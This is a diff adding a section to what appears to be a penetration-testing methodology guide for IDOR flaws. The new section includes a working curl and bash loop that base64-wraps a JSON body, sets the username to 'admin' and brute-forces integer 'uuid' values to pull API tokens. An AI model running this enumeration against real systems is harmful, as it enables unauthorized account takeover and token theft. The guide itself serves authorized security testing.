@@ -88,6 +88,28 @@ Discovery: Extract API version maps from JavaScript bundles (webpack chunks, Nex
 User lookup → IDOR chain:
 Endpoints like `/api/auth/inquire?username=X` or `/api/users/search?q=X` that return internal IDs (ObjectIds, UUIDs, numeric IDs) enable targeted IDOR. Always check for user lookup/search/autocomplete endpoints that leak IDs needed for other IDOR attacks.
 
+Integer-pretending-to-be-UUID IDOR:
+Endpoints take a base64-wrapped JSON body where a field is named `uuid` (or `guid`, `object_id`) but the value is actually a small integer primary key. Decode the body, swap the integer, and brute-force the small range. When the same body has a `username` side input, set it to a high-value account (`admin`, `administrator`, `root`) and watch for response differentials between a wrong-username and wrong-uuid mismatch — that gives you a username/id oracle.
+
+```bash
+# Endpoint accepts: {"data": "<base64 of inner JSON>"}
+INNER='{"get_token":"True","uuid":"955","username":"admin"}'
+PAYLOAD=$(python3 -c "import base64,sys;print(base64.b64encode(sys.stdin.read().encode()).decode())" <<<"$INNER")
+curl -s -X POST -b "$COOKIE" -H 'Content-Type: application/json' \
+  -d "{\"data\":\"$PAYLOAD\"}" "$BASE/api/v4/tokens/get"
+
+# Brute force the uuid range — response payload differentials reveal valid IDs
+for u in $(seq 1 1500); do
+  INNER="{\"get_token\":\"True\",\"uuid\":\"$u\",\"username\":\"admin\"}"
+  PAYLOAD=$(python3 -c "import base64,sys;print(base64.b64encode(sys.stdin.read().encode()).decode())" <<<"$INNER")
+  SIZE=$(curl -s -X POST -b "$COOKIE" -H 'Content-Type: application/json' \
+    -d "{\"data\":\"$PAYLOAD\"}" "$BASE/api/v4/tokens/get" | wc -c)
+  [ "$SIZE" -gt 200 ] && echo "uuid=$u → $SIZE bytes"
+done
+```
+
+Response often contains a persistent API token (or other sensitive material) inline once `username` + integer-pk align with a real account. Naming a field `uuid` does not make the value opaque — confirm the type before trusting the route.
+
 Burp Intruder setup:
 ```
 Position: /api/user/§1§
